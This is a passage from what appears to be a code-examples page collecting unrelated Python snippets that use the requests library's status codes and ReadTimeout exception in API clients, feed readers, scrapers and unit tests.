            return (None, UpdateResult.UNNEEDED)

        else:
            return (parsed, UpdateResult.SUCCESS) 
**************************************
def _raise_from_response(res):
    """
    Raises an appropriate `YggdrasilError` based on the `status_code` and
    `json` of a `requests.Request` object.
    """
    if res.status_code == requests.codes['ok']:
        return None

    exception = YggdrasilError()
    exception.status_code = res.status_code

    try:
        json_resp = res.json()
        if not ("error" in json_resp and "errorMessage" in json_resp):
            raise ValueError
    except ValueError:
        message = "[{status_code}] Malformed error message: '{response_text}'"
        message = message.format(status_code=str(res.status_code),
                                 response_text=res.text)
        exception.args = (message,)
    else:
        message = "[{status_code}] {error}: '{error_message}'"
        message = message.format(status_code=str(res.status_code),
                                 error=json_resp["error"],
                                 error_message=json_resp["errorMessage"])
        exception.args = (message,)
        exception.yggdrasil_error = json_resp["error"]
        exception.yggdrasil_message = json_resp["errorMessage"]
        exception.yggdrasil_cause = json_resp.get("cause")

    raise exception 
**************************************
def get_github_tags():
    resp = requests.get("https://api.github.com/repos/nebbles/gitcommit/tags")
    if resp.status_code == requests.codes["ok"]:
        tags_json = resp.json()
        tags = [tag["name"] for tag in tags_json]
        return tags
    else:
        print("Error fetching tags from GitHub")
        resp.raise_for_status() 
**************************************
def send_request(self, payload, **kwargs):
    # type: (dict, dict) -> dict
    kwargs.setdefault('headers', {})
    for key, value in iteritems(self.DEFAULT_HEADERS):
      kwargs['headers'].setdefault(key, value)

    response = self._send_http_request(
      # Use a custom JSON encoder that knows how to convert Tryte values.
      payload = JsonEncoder().encode(payload),

      url = self.node_url,
      **kwargs
    )

    return self._interpret_response(response, payload, {codes['ok']}) 
**************************************
def submitHttpRequest(httpMethod, uri, token, contentType='application/json', payload=None, xml=False):
    headers = getHeaders(token, contentType, xml)
    url = _getURL(uri)

    logger.info("%s %s" % (httpMethod, uri))
    if payload:
        logger.info(payload)
    if httpMethod == 'GET':
        response = session.get(url, verify=False, headers=headers)
    elif httpMethod == 'POST':
        response = session.post(url, data=payload, verify=False, headers=headers)
    elif httpMethod == 'PUT':
        response = session.put(url, data=payload, headers=headers, verify=False)
    else:
        raise Exception("Unknown/Unsupported HTTP method: " + httpMethod)
    if response.status_code == requests.codes['ok'] or response.status_code == 202:
            logger.debug("Response: %s" % response.text)
            return response
    else:
        logger.error("Request failed: %s" % response.status_code)
        if response.status_code == 401:
            # 401 response is html, so not parsing response
            error_details = "Unauthorized"
        elif 'text/html' in response.headers['Content-Type']:
            root = ET.fromstring(response.text)
            print(response.text)
            error_details = root.find("head/title").text
        else:
            error_json = json.loads(response.text)
            logger.info(error_json)
            if "details" in error_json:
                error_details = error_json["details"]
            else:
                error_details = response.reason

        raise Exception("%s: %s" % (str(response.status_code), error_details)) 
**************************************
def connect(self):
        '''
        connection function
        '''
        try:
            logger.debug("Establishing Connection")
            self.session = requests.session()
            self.session.verify = self.verify_callback

            pylxca_version = pkg_resources.require("pylxca")[0].version
            # Update the headers with your custom ones
            # You don't have to worry about case-sensitivity with
            # the dictionary keys, because default_headers uses a custom
            # CaseInsensitiveDict implementation within requests' source code.
            self.session.headers.update({'content-type': 'application/json; charset=utf-8','User-Agent': 'LXCA via Python Client / ' + pylxca_version})


            payload = dict(UserId= self.user, password=base64.b16decode(self.passwd).decode())
            pURL = self.url + '/sessions'
            self.session.mount(self.url, lxcaAdapter(max_retries=self.retires))
            r = self.session.post(pURL,data = json.dumps(payload),headers=dict(Referer=pURL),verify=self.verify_callback, timeout = 3)
            r.raise_for_status()
        except ConnectionError as e:
            logger.debug("Connection Exception as ConnectionError: Exception = %s", e)
            return False
        except requests.exceptions.HTTPError as e:
            logger.debug("Connection Exception as HttpError: Exception = %s", e.response.text)
            return False
        except Exception as e:
            logger.debug("Connection Exception: Exception = %s", e)
            return False

        '''
        Even though the csrf-token cookie will be automatically sent with the request,
        the server will be still expecting a valid X-Csrf-Token header,
        So we need to set it explicitly here
        '''
        if r.status_code == requests.codes['ok']:
            self.session.headers.update({'X-Csrf-Token': self.session.cookies.get('csrf')})

        return  True 
**************************************
def do_discovery(self,url, session, ip_addr,jobid):
        try:
            if ip_addr:
                url = url + '/discoverRequest'
                payload = [{"ipAddresses":ip_addr.split(",")}]
                resp = session.post(url,data = json.dumps(payload),verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
                if resp.status_code == requests.codes['ok'] or resp.status_code == requests.codes['created'] or resp.status_code == requests.codes['accepted']:
                    if "location" in resp.headers._store:
                        job = resp.headers._store["location"][-1].split("/")[-1]
                        return job
                    else:
                        return None
            elif jobid:
                url = url + '/discoverRequest/jobs/' + str(jobid)
                resp = session.get(url,verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
            else:
                url = url + '/discovery'
                resp = session.get(url, verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()

        except HTTPError as re:
            logger.error("Exception occured: %s",re)
            raise re
        return resp 
**************************************
def _translate_http_exceptions(resp: requests.Response) -> None:
        if resp.status_code == requests.codes['FORBIDDEN']:
            raise RuntimeError('Invalid MAL credentials!')

        if not resp.status_code == requests.codes['ALL_GOOD']:
            raise RuntimeError('MAL request failure!') 
**************************************
def catch_all(path):

    #retrieve and type-cast the header data
    hed = Headers(request.headers)

    #remove the bitcoin micropayment headers to receive payment from micropayments proxy
    hed.remove('HTTP_BITCOIN_MICROPAYMENT_SERVER')
    hed.remove('HTTP_RETURN_WALLET_ADDRESS')
    hed.remove('Bitcoin-Transfer')
    hed.remove('Authorization')
    hed.remove('Content-Length')

    #send payment notification to micropayments proxy
    return "[+] " + str(requests.codes['OK']) + " - payment received from micropayments proxy for paywalled resource\n" 
**************************************
def login(api_url, username, password):
    """Login to tendrl server."""

    post_data = {"username": username, "password": password}
    request = requests.post(
        "{}login".format(api_url),
        data=json.dumps(post_data))
    if request.status_code == requests.codes["ok"]:
        return request.json()
    else:
        response = {"url": request.url, "data": post_data}
        MODULE.fail_json(
            msg="Could not login with these credentials.",
            meta=response) 
**************************************
def is_bot_avaliable(user_id):
    """
    Returns true if the given user_id is an active bot that is available (i.e. is
    not currently 'active' which would mean it is in use by another user).
    """

    api_url = 'https://slack.com/api/users.getPresence'
    response = requests.get(api_url, params={'token': UQCSTESTING_USER_TOKEN, 'user': user_id})
    if response.status_code != requests.codes['ok']:
        return False

    json_contents = json.loads(response.content)
    return json_contents['ok'] and json_contents['presence'] == 'away' 
**************************************
def get_free_test_bot():
    """
    Pings a channel on the UQCSTesting Slack that contains all the available
    bots, and Mitch. We can poll this channel to find  bots which are 'away'
    (that is, not currently being used by anyone else)

    Returns info about the bot

    See https://api.slack.com/methods/users.info for the contents of info
    """
    api_url = 'https://slack.com/api/conversations.members'
    response = requests.get(api_url, params={'token': UQCSTESTING_USER_TOKEN,
                                             'channel': SECRET_BOT_MEETING_ROOM})
    if response.status_code != requests.codes['ok']:
        LOGGER.error(f'Received status code {response.status.code}')
        sys.exit(1)

    json_contents = json.loads(response.content)
    if not json_contents['ok']:
        LOGGER.error(json_contents['error'])
        sys.exit(1)

    for user_id in json_contents['members']:
        info = get_user_info(user_id)
        if is_active_bot(info) and is_bot_avaliable(user_id):
            return info
    return None 
**************************************
def get_html(url):
    """Fetch HTML and convert to lowercase. If error, prepend with '_HTTP_ERROR_'."""
    # Some pages dislike custom agents. Define alternatives.
    alt_agents = [
        'MEMEX_PageClass_bot/0.5',
        'Mozilla/5.0',
        'Gecko/1.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
        'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        ]

    for agent in alt_agents:
        r = requests.get(url, params={'User-Agent': agent})
        if r.status_code == requests.codes['ok']:
            return r.text.lower()
        wait = 1
        if r.status_code == requests.codes['too_many']:
            wait = int(r.headers['Retry-After'])
        print('*** Agent "%s" failed. Retrying...' % agent)
        sleep(wait) # Reduce chance of 429 error (Too many requests)
    print("\tERROR  :", r.status_code)
    print("\tCOOKIES:", [x for x in r.cookies])
    print("\tHISTORY:", r.history)
    print("\tHEADERS:", r.headers)
    print("\tRESPONSE:", r.text[:100], '...')
    return "_HTTP_ERROR_" + r.text.lower() 
**************************************
def send_notification(self, message):
        try:
            provider = self._settings.get(["notification_provider"])
            if provider == 'ifttt':
                event = self._settings.get(["notification_event_name"])
                api_key = self._settings.get(["notification_api_key"])
                self._logger.debug("Sending notification to: %s with msg: %s with key: %s", provider, message,
                        api_key)
                try:
                    res = self.ifttt_notification(message, event, api_key)
                except requests.exceptions.ConnectionError:
                    self._logger.info("Error: Could not connect to IFTTT")
                except requests.exceptions.HTTPError:
                    self._logger.info("Error: Received invalid response")
                except requests.exceptions.Timeout:
                    self._logger.info("Error: Request timed out")
                except requests.exceptions.TooManyRedirects:
                    self._logger.info("Error: Too many redirects")
                except requests.exceptions.RequestException as reqe:
                    self._logger.info("Error: {e}".format(e=reqe))
                if res.status_code != requests.codes['ok']:
                    try:
                        j = res.json()
                    except ValueError:
                        self._logger.info('Error: Could not parse server response. Event not sent')
                    for err in j['errors']:
                        self._logger.info('Error: {}'.format(err['message']))
        except Exception as ex:
            self.log_error(ex)
            pass 
**************************************
def get_feed(self, attempt_count: int=0) -> "UpdateResult":
        """
        Get latest RSS structure for this subscription.
        Return status code indicating result.

        :param attempt_count: Number of times to attempt.
        :returns: UpdateResult status code.
        """
        res = None
        if attempt_count > MAX_RECURSIVE_ATTEMPTS:
            LOG.debug(f"Too many recursive attempts ({attempt_count}) to get feed for sub"
                      f"{self.metadata['name']}, canceling.")
            res = UpdateResult.FAILURE

        elif self.url is None or self.url == "":
            LOG.debug(f"URL {self.url} is empty , cannot get feed for sub "
                      f"{self.metadata['name']}.")
            res = UpdateResult.FAILURE

        if res is not None:
            return res

        else:
            LOG.info(f"Getting entries (attempt {attempt_count}) for {self.metadata['name']} "
                     f"from {self.url}.")

        (parsed, code) = self._feedparser_parse_with_options()
        if code == UpdateResult.UNNEEDED:
            LOG.info("We have the latest feed, nothing to do.")
            return code

        elif code != UpdateResult.SUCCESS:
            LOG.info(f"Feedparser parse failed ({code}), aborting.")
            return code

        LOG.debug("Feedparser parse succeeded.")

        # Detect some kinds of HTTP status codes signaling failure.
        code = self._handle_http_codes(parsed)
        if code == UpdateResult.ATTEMPT_AGAIN:
            LOG.debug("Transient HTTP error, attempting again.")
            temp = self.temp_url
            code = self.get_feed(attempt_count=attempt_count + 1)
            if temp is not None:
                self.url = temp

        elif code != UpdateResult.SUCCESS:
            LOG.debug(f"Ran into HTTP error ({code}), aborting.")

        else:
            self.feed_state.load_rss_info(parsed)

        return code 
**************************************
def _handle_http_codes(self, parsed: feedparser.FeedParserDict) -> "UpdateResult":
        """
        Given feedparser parse result, determine if parse succeeded, and what to do about that.
        """
        # feedparser gives no status if you feedparse a local file.
        if "status" not in parsed:
            LOG.debug("Saw status 200 - OK, all is well.")
            return UpdateResult.SUCCESS

        status = parsed.get("status", 200)
        result = UpdateResult.SUCCESS
        if status == requests.codes["NOT_FOUND"]:
            LOG.error(f"Saw status {status}, unable to retrieve feed text for "
                      f"{self.metadata['name']}."
                      f"\nStored URL {self.url} for {self.metadata['name']} will be preserved"
                      f"and checked again on next attempt.")

            result = UpdateResult.FAILURE

        elif status in [requests.codes["UNAUTHORIZED"], requests.codes["GONE"]]:
            LOG.error(f"Saw status {status}, unable to retrieve feed text for "
                      f"{self.metadata['name']}."
                      f"\nClearing stored URL {self.url} for {self.metadata['name']}."
                      f"\nPlease provide new URL and authorization for subscription "
                      f"{self.metadata['name']}.")

            self.url = ""
            result = UpdateResult.FAILURE

        # handle redirecting errors
        elif status in [requests.codes["MOVED_PERMANENTLY"], requests.codes["PERMANENT_REDIRECT"]]:
            LOG.warning(f"Saw status {status} indicating permanent URL change."
                        f"\nChanging stored URL {self.url} for {self.metadata['name']} to "
                        f"{parsed.get('href')} and attempting get with new URL.")

            self.url = parsed.get("href")
            result = UpdateResult.ATTEMPT_AGAIN

        elif status in [requests.codes["FOUND"], requests.codes["SEE_OTHER"],
                        requests.codes["TEMPORARY_REDIRECT"]]:
            LOG.warning(f"Saw status {status} indicating temporary URL change."
                        f"\nAttempting with new URL {parsed.get('href')}."
                        f"\nStored URL {self.url} for {self.metadata['name']} will be unchanged.")

            self.temp_url = self.url
            self.url = parsed.get("href")
            result = UpdateResult.ATTEMPT_AGAIN

        elif status != 200:
            LOG.warning(f"Saw '{status}'. Retrying retrieve for {self.metadata['name']} "
                        f"at {self.url}.")
            result = UpdateResult.ATTEMPT_AGAIN

        else:
            LOG.debug("Saw status 200. Success!")

        return result 
**************************************
def do_unmanage(self,url, session, endpoints,force,jobid):

        endpoints_list = list()
        param_dict = dict()

        try:
            if endpoints:
                url = url + '/unmanageRequest'
                for each_ep in endpoints.split(","):
                    ip_addr = None
                    each_ep_dict = dict()

                    ep_data = each_ep.split(";")
                    ip_addr = ep_data[0]
                    uuid = ep_data[1]
                    type = ep_data[2]
                    #Fetch type value from input
                    type_list = ["Chassis","Rackswitch","ThinkServer","Storage","Rack-Tower"]
                    if type not in type_list:
                        raise Exception("Invalid Type Specified")
                    if type == "ThinkServer": type = "Lenovo ThinkServer"
                    elif type == "Storage": type = "Lenovo Storage"
                    elif type == "Rack-Tower": type = "Rack-Tower Server"
                    each_ep_dict = {"ipAddresses":ip_addr.split("#"),"type":type,"uuid":uuid}
                    endpoints_list.append(each_ep_dict)
                param_dict["endpoints"] = endpoints_list

                if force:
                    if isinstance(force, bool):
                        param_dict["forceUnmanage"] = force
                    else:
                        if force.lower() == "true":
                            param_dict["forceUnmanage"] = True
                        else:
                            param_dict["forceUnmanage"] = False

                payload = param_dict
                resp = session.post(url,data = json.dumps(payload),verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
                if resp.status_code == requests.codes['ok'] or resp.status_code == requests.codes['created'] or resp.status_code == requests.codes['accepted']:
                    if "location" in resp.headers._store:
                        job = resp.headers._store["location"][-1].split("/")[-1]
                        return job
                    else:
                        return None
            elif jobid:
                url = url + '/unmanageRequest/jobs/' + str(jobid)
                resp = session.get(url,verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
            else:
                logger.error("Invalid execution of unmanage REST API")
                raise Exception("Invalid execution of unmanage REST API")

        except HTTPError as re:
            logger.error("Exception occured: %s",re)
            raise re

        return resp 
**************************************
def get_jobs(self,url, session,jobid,uuid,state,canceljobid,deletejobid):
        url = url + '/jobs'
        try:
            if jobid:
                url = url + '/' + jobid

                if state:
                    if state == "Pending " or state == "Running" \
                    or state == "Complete" or state == "Cancelled" \
                    or state == "Running_With_Errors" or state == "Cancelled_With_Errors" \
                    or state == "Stopped_With_Error" or state == "Interrupted":
                        url = url + '?state=' + state
                        if uuid:
                            url = url + ',uuid=' + uuid
                    else:
                        raise Exception("Invalid argument 'state': %s" %state)
                if state == None and uuid:
                    url = url + '?uuid=' + uuid

                resp = session.get(url, verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
            elif canceljobid:
                url = url + '/' + canceljobid
                payload = {"cancelRequest":"true"}
                resp = session.put(url,data = json.dumps(payload),verify=False, timeout=REST_TIMEOUT)
                if resp.status_code == requests.codes['ok'] or resp.status_code == requests.codes['created'] or resp.status_code == requests.codes['accepted']:
                    return True
                resp.raise_for_status()
            elif deletejobid:
                url = url + '/' + deletejobid
                resp = session.delete(url,verify=False, timeout=REST_TIMEOUT)
                if resp.status_code == requests.codes['ok'] or resp.status_code == requests.codes['created'] or resp.status_code == requests.codes['accepted']:
                    return True
                resp.raise_for_status()
            else:
                if state:
                    if state == "Pending" or state == "Running" \
                    or state == "Complete" or state == "Cancelled" \
                    or state == "Running_With_Errors" or state == "Cancelled_With_Errors" \
                    or state == "Stopped_With_Error" or state == "Interrupted":
                        url = url + '?state=' + state
                        if uuid:
                            url = url + ',uuid=' + uuid
                    else:
                        raise Exception("Invalid argument 'state': %s" %state)
                if state == None and uuid:
                    url = url + '?uuid=' + uuid

                resp = session.get(url, verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
        except HTTPError as re:
            logger.error("REST API Exception: Exception = %s", re)
            raise re
        return resp 
**************************************
def transcribe(self, fp):
        """
        Performs STT via the Google Speech API, transcribing an audio file and
        returning an English string.

        Arguments:
        audio_file_path -- the path to the .wav file to be transcribed
        """

        if not self.api_key:
            self._logger.critical('API key missing, transcription request ' +
                                  'aborted.')
            return []
        elif not self.language:
            self._logger.critical('Language info missing, transcription ' +
                                  'request aborted.')
            return []

        wav = wave.open(fp, 'rb')
        frame_rate = wav.getframerate()
        wav.close()
        data = fp.read()

        headers = {'content-type': 'audio/l16; rate=%s' % frame_rate}
        r = self._http.post(self.request_url, data=data, headers=headers)
        try:
            r.raise_for_status()
        except requests.exceptions.HTTPError:
            self._logger.critical('Request failed with http status %d',
                                  r.status_code)
            if r.status_code == requests.codes['forbidden']:
                self._logger.warning('Status 403 is probably caused by an ' +
                                     'invalid Google API key.')
            return []
        r.encoding = 'utf-8'
        try:
            # We cannot simply use r.json() because Google sends invalid json
            # (i.e. multiple json objects, seperated by newlines. We only want
            # the last one).
            response = json.loads(list(r.text.strip().split('\n', 1))[-1])
            if len(response['result']) == 0:
                # Response result is empty
                raise ValueError('Nothing has been transcribed.')
            results = [alt['transcript'] for alt
                       in response['result'][0]['alternative']]
        except ValueError as e:
            self._logger.warning('Empty response: %s', e.args[0])
            results = []
        except (KeyError, IndexError):
            self._logger.warning('Cannot parse response.', exc_info=True)
            results = []
        else:
            # Convert all results to uppercase
            results = tuple(result.upper() for result in results)
            self._logger.info('Transcribed: %r', results)
        return results 

Python requests.ReadTimeout() Examples

**************************************
def request(session, method, url, **kwargs):
    """
    :desc: Custom wrapper method to add a timeout message
           when there is a `requests.exceptions.ConnectionError`
           or `requests.ReadTimeout` exception.
    :param: `session` requests.Session object
            `method` HTTP method to use
            `url` name of the URL
    :return: requests.Response object.
    """

    try:
        return session.request(method=method, url=url, timeout=(5, 5), **kwargs)
    except (ConnectionError, ReadTimeout):
        print(INTERNET_DOWN_MSG)
        sys.exit(1) 
**************************************
def test_watch_restart(self, m_get):
        path = '/test'
        data = [{'object': {'metadata': {'name': 'obj%s' % i,
                                         'resourceVersion': i}}}
                for i in range(3)]
        lines = [jsonutils.dump_as_bytes(i) for i in data]

        m_resp = mock.MagicMock()
        m_resp.ok = True
        m_resp.iter_lines.side_effect = [lines, requests.ReadTimeout, lines]
        m_get.return_value = m_resp

        self.assertEqual(data * 2,
                         list(itertools.islice(self.client.watch(path),
                                               len(data) * 2)))
        self.assertEqual(3, m_get.call_count)
        self.assertEqual(3, m_resp.close.call_count)
        m_get.assert_any_call(
            self.base_url + path, headers={}, stream=True,
            params={"watch": "true"}, cert=(None, None), verify=False,
            timeout=(30, 60))
        m_get.assert_any_call(
            self.base_url + path, headers={}, stream=True,
            params={"watch": "true", "resourceVersion": 2}, cert=(None, None),
            verify=False, timeout=(30, 60)) 
**************************************
def _run_once(self):
        try:
            if self.settings.DO_INBOX or self.settings.DO_FALSEPOS:
                await self._process_messages()
                asyncio.sleep(5)

            for multi in settings.MULTIREDDITS:
                if self.settings.DO_OC:
                    asyncio.sleep(5)
                    await self._process_oc_stream(multi)

            for multi in settings.MULTIREDDITS + [settings.PARENT_SUB]:
                if self.settings.DO_MODLOG:
                    asyncio.sleep(5)
                    await self._process_network_modlog(multi)

        except (HTTPException, requests.ReadTimeout,
                requests.ConnectionError) as ex:
            LOG.error('%s: %s', type(ex), ex)
        else:
            LOG.debug('All tasks processed.')

    # ====================================================== 
**************************************
def soupify_url(url, timeout=2, encoding='utf-8', **kwargs):
    """Given a url returns a BeautifulSoup object"""
    try:
        r = requests.get(url, timeout=timeout, **kwargs)
    except ReadTimeout:
        logger.info("[soupify_url] Request for %s timed out.", url)
        raise
    except Exception as e:
        logger.error(f"Request for {url} could not be resolved", exc_info=True)
        raise ConnectionError(repr(e))


    r.raise_for_status()
    r.encoding = encoding
    if r.status_code == 200:
        return BeautifulSoup(r.text, 'lxml')
    else:
        raise ConnectionError(
            f'{url} returned error status %s - ', r.status_code, r.reason
        ) 
**************************************
def test_watch_restart(self, m_get):
        path = '/test'
        data = [{'object': {'metadata': {'name': 'obj%s' % i,
                                         'resourceVersion': i}}}
                for i in range(3)]
        lines = [jsonutils.dump_as_bytes(i) for i in data]

        m_resp = mock.MagicMock()
        m_resp.ok = True
        m_resp.iter_lines.side_effect = [lines, requests.ReadTimeout, lines]
        m_get.return_value = m_resp

        self.assertEqual(data * 2,
                         list(itertools.islice(self.client.watch(path),
                                               len(data) * 2)))
        self.assertEqual(3, m_get.call_count)
        self.assertEqual(3, m_resp.close.call_count)
        m_get.assert_any_call(
            self.base_url + path, headers={}, stream=True,
            params={"watch": "true"}, cert=(None, None), verify=False,
            timeout=(30, 60))
        m_get.assert_any_call(
            self.base_url + path, headers={}, stream=True,
            params={"watch": "true", "resourceVersion": 2}, cert=(None, None),
            verify=False, timeout=(30, 60)) 
**************************************
def download_report(host):
    if host == 'self':
        # Avoid making a nested HTTP request to itself (may cause a deadlock
        # or timeout if the web app runs in a single thread).
        return machine_status()

    try:
        resp = requests.get(host + '/gpu_status', timeout=5)
        if resp.status_code != 200:
            return {'error': 'Bad response (%s: %s)' % (resp.status_code, resp.reason)}
    except ConnectionError:
        return {'error': 'Host not available'}
    except ReadTimeout:
        return {'error': 'Connection timeout'}

    return resp.json() 
**************************************
def test_confirm_retries_on_read_timeout_error(self, requests_mock, test_data):
        envelope_url = (
            'https://api.ingest.dev.data.humancellatlas.org/submissionEnvelopes/abcde'
        )

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.put(
            '{}/submissionEvent'.format(envelope_url), json=_request_callback
        )
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager(), mock.patch(
            'pipeline_tools.shared.auth_utils.DCPAuthClient.get_auth_header',
            return_value=test_data.headers,
        ):
            confirm_submission.confirm(
                envelope_url,
                HttpRequests(),
                test_data.runtime_environment,
                test_data.service_account_path,
            )
        assert requests_mock.call_count == 3 
**************************************
def test_add_analysis_protocol_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        analysis_protocol_url = (
            'https://api.ingest.dev.data.humancellatlas.org/abcde/protocols'
        )

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.post(analysis_protocol_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.add_analysis_protocol(
                analysis_protocol_url,
                test_data.headers,
                test_data.analysis_protocol,
                HttpRequests(),
            )
        assert requests_mock.call_count == 3 
**************************************
def test_add_analysis_process_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        analysis_process_url = (
            'https://api.ingest.dev.data.humancellatlas.org/abcde/processes'
        )

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.post(analysis_process_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.add_analysis_process(
                analysis_process_url,
                test_data.headers,
                test_data.analysis_process,
                HttpRequests(),
            )
        assert requests_mock.call_count == 3 
**************************************
def test_add_input_bundles_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        input_bundles_url = 'https://api.ingest.dev.data.humancellatlas.org/processes/abcde/bundleReferences'

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.put(input_bundles_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.add_input_bundles(
                input_bundles_url,
                test_data.headers,
                test_data.analysis_process,
                HttpRequests(),
            )
        assert requests_mock.call_count == 3 
**************************************
def test_add_file_reference_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        file_refs_url = 'https://api.ingest.dev.data.humancellatlas.org/processes/abcde/fileReference'

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.put(file_refs_url, json=_request_callback)
        file_ref = {
            'describedBy': 'https://schema.humancellatlas.org/type/file/schema_version/analysis_file',
            'schema_type': 'file',
            'file_core': {
                'file_name': 'test',
                'format': 'bam',
                'checksum': '0123456789abcdef0123456789abcdef',
            },
        }
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.add_file_reference(
                file_ref, file_refs_url, test_data.headers, HttpRequests()
            )
        assert requests_mock.call_count == 3 
**************************************
def test_link_analysis_protocol_to_analysis_process_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        links_url = (
            'https://api.ingest.dev.data.humancellatlas.org/processes/abcde/protocols'
        )
        analysis_protocol_url = (
            'https://api.ingest.dev.data.humancellatlas.org/protocols/abcde'
        )

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.put(links_url, json=_request_callback)

        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.link_analysis_protocol_to_analysis_process(
                test_data.headers, links_url, analysis_protocol_url, HttpRequests()
            )
        assert requests_mock.call_count == 3 
**************************************
def _start_subprocess(self):
        # Start subprocess. Don't use stdin; it breaks multiprocessing somehow!
        self._p = subprocess.Popen(
            [sys.executable, testfilename],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        # Wait for process to start, and make sure it is not dead
        while self._p.poll() is None:
            time.sleep(0.02)
            try:
                requests.get(URL + "/specialtestpath/init", timeout=0.01)
                break
            except (requests.ConnectionError, requests.ReadTimeout):
                pass
        if self._p.poll() is not None:
            raise RuntimeError(
                "Process failed to start!\n" + self._p.stdout.read().decode()
            ) 
**************************************
def __request_data(self):
        if self.__is_cache_valid():
            return True

        # requesting data
        try:
            # setting 5 sec timeouts for connect and read
            r = requests.get(self.data_url, verify=False, allow_redirects=True, timeout=(5, 5))
        except requests.ConnectionError as e:
            print("Unable to connect to ", self.data_url, " error is ", e, file=sys.stderr)
            return False
        except requests.ConnectTimeout as e:
            print("Timed out connection to ", self.data_url, " error is ", e, file=sys.stderr)
            return False
        except requests.ReadTimeout as e:
            print("Timed out while reading data from ", self.data_url, " error is ", e, file=sys.stderr)
            return False

        if r.status_code == 200:
            # got HTTP/200 for request - storing it in cache
            try:
                open(self.temp_file_name, mode="w").write(json.dumps(r.json()))
            except IOError as e:
                print("IO error while trying to store cache into file ", self.temp_file_name, " error is ",
                      e, file=sys.stderr)
                return False
            return True
        else:
            return False 
**************************************
def run(self):
        while True:
            stream = submission_stream(self.r, 'all', verbosity=0)

            try:
                for post in stream:
                    self._do_post(post)
            except (HTTPException, requests.ReadTimeout,
                    requests.ConnectionError) as e:
                LOG.error('{}: {}'.format(type(e), e))
            else:
                LOG.error('Stream ended.')

            LOG.info('Sleeping for {} minutes.'.format(RETRY_MINUTES))
            sleep(60 * RETRY_MINUTES) 
**************************************
def proxy(path):
    """
    Main proxy function. Handles incoming HTTP queries.
    """

    lang = request.args.get('lang', 'en')
    query_string = request.query_string
    query_string = query_string.replace('sr-lat', 'sr')
    query_string = query_string.replace('lang=None', 'lang=en')
    content, headers = _load_content_and_headers(path, query_string)

    if content is None:
        srv = _find_srv_for_query(path, query_string)
        url = '%s/%s?%s' % (srv, path, query_string)
        print(url)

        attempts = 10
        response = None
        while attempts:
            try:
                response = requests.get(url, timeout=2)
            except requests.ReadTimeout:
                attempts -= 1
                continue
            try:
                json.loads(response.content)
                break
            except ValueError:
                attempts -= 1

        _touch_empty_file(path, query_string, content, headers)
        if response:
            headers = {}
            headers['Content-Type'] = response.headers['content-type']
            content = add_translations(response.content, lang)
            _save_content_and_headers(path, query_string, content, headers)
        else:
            content = "{}"

    return content, 200, headers 
**************************************
def create_conn_obj(self):
        user_agent = get_desktop_uagent()
        if self.url:
            url = self.url
        else:
            url = '{}://{}:{}/'.format(self.transport, self.hostname, self.port)

        try:
            r = requests.get(url, timeout=10, headers={'User-Agent': user_agent})
            self.server_headers = r.headers
        except ConnectTimeout, ReadTimeout:
            return False 
**************************************
def _download(self, request, spider):
        def _retry():
            if self.retry_on_download_timeout:
                self.logger.debug('Read timed out, retry request {}'.format(request))
                self.crawl(request, spider)

        try:
            self._process_request(request, spider)

            if request is None:
                return

            method = request.method.upper()

            resp = None
            kw_params = {
                'timeout': self.download_timeout,
                'cookies': request.cookies,
                'headers': request.headers,
                'proxies': {
                    'http': request.proxy,
                    'https': request.proxy
                }
            }

            self.logger.debug('[{}]<{} {}>'.format(spider.name, method, request.url))

            if method == 'GET':
                resp = requests.get(request.url, **kw_params)
            elif method == 'POST':
                resp = requests.post(request.url, request.data, **kw_params)

            self._responses_queue.put((Response(resp.url, resp.status_code, resp.content, request,
                                                resp.cookies), spider))
        except (requests.ReadTimeout, requests.ConnectTimeout, requests.ConnectionError):
            _retry()
        except Exception as err:
            self.logger.error(err, exc_info=True) 
**************************************
def _request(self, url: str, method: str = 'get', **kwargs):
        timeout = self._timeout

        method = getattr(requests, method)

        LOG.debug('URL: %s', url)

        def do_request():

            request_kwargs = {
                'headers': {
                    'User-agent': 'ruopenrefs/%s' % VERSION_STR,
                },
                'timeout': timeout,
                'verify': False,
            }
            request_kwargs.update(kwargs)

            try:
                response = method(url, **request_kwargs)  # type: requests.Response

            except requests.ReadTimeout:
                raise ConnectionError('Request timed out.') from None

            except requests.ConnectionError:
                raise ConnectionError('Unable to connect to %s.' % url)

            try:
                response.raise_for_status()

            except requests.HTTPError:
                msg = response.content
                status_code = response.status_code
                LOG.debug('API call error, code [%s]:\n%s', status_code, msg)
                raise ApiCallError(msg, status_code)

            return response

        return OpenRefsResponse(response=do_request()) 
**************************************
def wait(self, exists=True, timeout=None):
        """
